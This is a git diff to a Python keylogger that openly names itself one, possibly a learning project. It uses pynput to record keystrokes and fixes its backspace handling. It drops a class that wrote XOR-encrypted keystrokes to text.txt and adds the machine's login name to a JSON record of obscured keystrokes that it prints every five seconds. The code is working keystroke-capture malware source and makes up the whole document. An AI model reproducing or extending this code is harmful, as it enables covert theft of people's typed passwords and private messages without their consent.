@@ -2,7 +2,7 @@ from pynput import keyboard
 from abc import ABC, abstractmethod
 import threading
 
-text = []
+
 #מחלקה שמפעילה את התוכנית או מכבה
 class IKeyLogger(ABC):
     def __init__(self):
@@ -60,7 +60,6 @@ class KeyLoggerService(IKeyLogger):
     def start_logging(self): 
         
         def on_press(key):
-            global text
             if key == keyboard.Key.enter:
                 self.text.append(key)
             elif key == keyboard.Key.tab:
@@ -69,9 +68,9 @@ class KeyLoggerService(IKeyLogger):
                 self.text.append(' ') 
             elif key == keyboard.Key.shift:
                 pass
-            elif key == keyboard.Key.backspace and len(text) == 0:
+            elif key == keyboard.Key.backspace and len(self.text) == 0:
                 pass
-            elif key == keyboard.Key.backspace and len(text) > 0:
+            elif key == keyboard.Key.backspace and len(self.text) > 0:
                 self.text = self.text[:-1]
             elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                 pass
@@ -92,40 +91,27 @@ class KeyLoggerService(IKeyLogger):
     def get_logged_keys(self):
         return self.text
 
-class FileWriter(IWriter):
-    def __init__(self):
-        super().__init__()
-        self.Encryption = Encryptor()
-    def send_data(self, data:str , machine_name: str):
-            text = ''
-            for i in data:
-                text += self.Encryption.encryption_using_xor(i)
-            with open('text.txt','a') as file:
-                        file.write(text)
 
                      
 # a = KeyLoggerService()
 # a.start_logging()
 # b = FileWriter()
 # b.send_data()
-class KeyLoggerManager(FileWriter,KeyLoggerService):
+class KeyLoggerManager(KeyLoggerService):
     def __init__(self):
         super().__init__()
 
     def start(self):
             from datetime import datetime
-            import time
-            import json
-            writing_to_a_file = FileWriter()
+            import time, os, json
+            machine = os.getlogin()
             self.start_logging()
             self.Encryption = Encryptor()
             while True:
-                    writing_to_a_file.send_data(self.text,'l')
-                    start_time = str(datetime.now())
+                    import time
                     time.sleep(5)
-                    
-                    end_time = str(datetime.now())
-                    jeson = {'start time':start_time,'data':self.Encryption.encryption_using_xor(str(self.text),4),'end time':end_time}
+                    time = str(datetime.now())
+                    jeson = {'time':time,'data':self.Encryption.encryption_using_xor(str(self.text),4),'machine':machine}
                     json.dumps(jeson,ensure_ascii=False)
                     print(jeson)
                     self.text.clear()
